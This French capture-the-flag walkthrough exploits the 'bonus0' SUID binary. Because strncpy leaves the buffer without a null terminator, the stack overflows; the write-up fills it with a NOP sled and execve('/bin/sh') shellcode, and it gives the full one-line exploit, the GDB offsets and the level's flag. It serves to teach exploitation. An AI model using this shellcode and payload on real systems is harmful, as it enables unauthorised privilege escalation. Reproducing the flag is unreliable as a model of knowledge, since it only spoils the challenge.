# Bonus0 - Walkthrough

## Objectif
Exploiter un **strncpy sans null-terminator** pour déborder sur la stack et écraser la **saved return address** avec l'adresse d'un shellcode injecté.

**Technique** : Stack Buffer Overflow via strncpy + Shellcode Injection (NOP sled)

---

## Étapes d'exploitation

### 1. Reconnaissance
```bash
ls -la
# -rwsr-s---+ 1 bonus1 users  5564 Mar  6  2016 bonus0
# ⚠️ Bit SUID actif → s'exécute avec les droits de bonus1

./bonus0
#  -
# test
#  -
# hello
# test hello
```

### 2. Analyse du code (Ghidra)

```cpp
void p(char *param_1, char *param_2) {
    char local_100c[4104];
    puts(param_2);
    read(0, local_100c, 0x1000);        // Lit jusqu'à 4096 bytes
    pcVar1 = strchr(local_100c, 10);
    *pcVar1 = '\0';                      // Remplace '\n' par '\0'
    strncpy(param_1, local_100c, 0x14); // ⚠️ Copie 20 bytes SANS \0 si input >= 20 chars
}

void pp(char *param_1) {
    char local_34[20];
    char local_20[20];
    p(local_34, &DAT_080486a0);         // 1er input → local_34
    p(local_20, &DAT_080486a0);         // 2ème input → local_20
    strcpy(param_1, local_34);          // ⚠️ strlen déborde dans local_20 si local_34 pas null-terminé
    (param_1 + strlen_result)[0] = ' ';
    (param_1 + strlen_result)[1] = '\0';
    strcat(param_1, local_20);          // Ajoute local_20 → overflow total
}

int main(void) {
    char local_3a[54];
    pp(local_3a);                        // ⚠️ Peut écraser la saved return address !
    puts(local_3a);
    return 0;
}
```

**Vulnérabilité** : Si le 1er input fait ≥ 20 chars, `strncpy` copie 20 bytes **sans `\0`** dans `local_34`. La boucle `strlen` de `pp` continue de lire dans `local_20`. Le résultat dans `local_3a[54]` atteint 61 bytes → overflow.

### 3. Comprendre le layout mémoire

```
Dans pp() (stack) :
local_34[20] : 1er input — PAS de \0 si input ≥ 20 chars
local_20[20] : 2ème input

Contenu final dans local_3a[54] après pp() :
[local_34: 20B][local_20: 20B][' ': 1B][local_20: 20B]
                                         ^--- strcat() ajoute local_20 une 2ème fois
Total = 61 bytes dans un buffer de 54 → débordement de 7 bytes sur la stack
```

**Localisation d'EIP dans le 2ème input** :
```
local_3a[54] :
[20B NOP] [20B arg2] [1B espace] [arg2 répété]
                                  ^^^
                                  offset = 9 dans le 2ème input = EIP
```

### 4. Trouver l'offset avec GDB

```bash
(gdb) run
# 1er input (exactement 20 chars pour bloquer le \0) :
01234567890123456789
# 2ème input (pattern cyclique) :
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9...

Program received signal SIGSEGV
eip = 0x41336141
```

→ Pattern `0x41336141` = `"Aa3A"` → **offset = 9** bytes dans le 2ème input.

### 5. Trouver l'adresse du buffer avec GDB

```bash
(gdb) set disassembly-flavor intel
(gdb) disass p
   0x080484d0 <+28>: lea eax,[ebp-0x1008]   # ← adresse de local_100c[4096]
(gdb) b *p+28
(gdb) run
# Entrer n'importe quoi pour le 1er input
Breakpoint 1, 0x080484d0 in p ()
(gdb) x $ebp-0x1008
0xbfffe680:  0x00000000                      # ← Adresse de base du grand buffer
```

**Adresse NOP choisie** : `0xbfffe6d0`
- Doit être entre `0xbfffe680 + 61 = 0xbfffe6bd` (fin des arguments) et `0xbfffe680 + 100 = 0xbfffe6e4` (fin des NOPs)
- `0xbfffe6d0` est au milieu de la zone NOP → marge suffisante

### 6. Construction du payload

```
1er input : [NOP * 100] + [shellcode 28 bytes]
            → strncpy ne prend que les 20 premiers NOP pour local_34
            → Mais le shellcode reste dans local_100c en mémoire stack !

2ème input : ["A" * 9] + [adresse: \xd0\xe6\xff\xbf] + ["B" * 7]
              ^offset    ^EIP écrasé                    ^padding
```

**Shellcode** (28 bytes) : `execve("/bin/sh")` + `exit(0)`
```
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80
```

### 7. Exploitation

```bash
(python -c 'print "\x90" * 100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"'; \
 python -c 'print "A" * 9 + "\xd0\xe6\xff\xbf" + "B" * 7'; \
 cat) | ./bonus0
```

**Résultat** :
```bash
$ whoami
bonus1
$ cat /home/user/bonus1/.pass
cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
```

---

## Déroulement de l'attaque

```
1. p() — 1er input :
   local_100c = [\x90*100][shellcode]
   strncpy(local_34, local_100c, 20) → local_34 = [\x90*20]  (PAS de \0 !)

2. p() — 2ème input :
   local_100c = ["A"*9][\xd0\xe6\xff\xbf]["B"*7]
   strncpy(local_20, local_100c, 20) → local_20 = ["A"*9][addr]["B"*7]

3. pp() → strcpy(local_3a, local_34) :
   local_34 pas null-terminé → strlen() lit dans local_20 !
   local_3a ← [\x90*20]["A"*9][addr]["B"*7]

4. strcat(local_3a, local_20) :
   local_3a ← [\x90*20]["A"*9][addr]["B"*7][ ]["A"*9][addr]["B"*7]
   Total = 61 bytes → déborde local_3a[54]
   EIP = 0xbfffe6d0 ✅

5. ret → 0xbfffe6d0 → NOP sled → shellcode → /bin/sh 🎉
```

---

## Flag
```
cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
```

## Type de vulnérabilité
- Stack-based Buffer Overflow (CWE-121)
- strncpy sans null-terminator (CWE-170)
- Shellcode Injection
- NOP sled technique
- SUID privilege escalation (CWE-250)
